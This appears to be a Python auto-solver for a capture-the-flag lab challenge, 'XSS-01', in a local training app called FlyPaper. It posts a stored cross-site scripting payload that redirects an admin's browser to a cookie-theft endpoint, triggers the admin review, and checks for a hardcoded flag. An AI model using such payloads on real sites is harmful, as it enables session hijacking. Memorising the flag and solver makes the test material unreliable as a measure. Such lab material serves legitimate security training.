#!/usr/bin/env python3
"""Auto-solver XSS-01 (requiere FlyPaper en marcha + requests)."""

import argparse
import sys

from solve_ctf_auth import asegurar_sesion

FLAG = "flag{xss_almacenado_admin}"


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--base", default="http://127.0.0.1:5000")
    args = p.parse_args()
    base = args.base.rstrip("/")
    s = asegurar_sesion(base)

    payload = (
        "<script>document.location='/objetivos/xss/01/robo-cookie'</script>"
    )
    r = s.post(
        f"{base}/objetivos/xss/01/comentario",
        json={"contenido": payload},
        headers={"Accept": "application/json"},
        timeout=20,
    )
    r.raise_for_status()
    token = r.json().get("token_robo")
    assert token, "Sin token_robo"

    s.post(f"{base}/objetivos/xss/01/admin-revisar", timeout=20)
    r = s.get(f"{base}/objetivos/xss/01/robo-cookie", params={"token": token}, timeout=20)
    r.raise_for_status()
    assert FLAG in r.text, "Flag no presente"
    print(f"[OK] XSS-01 — {FLAG}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
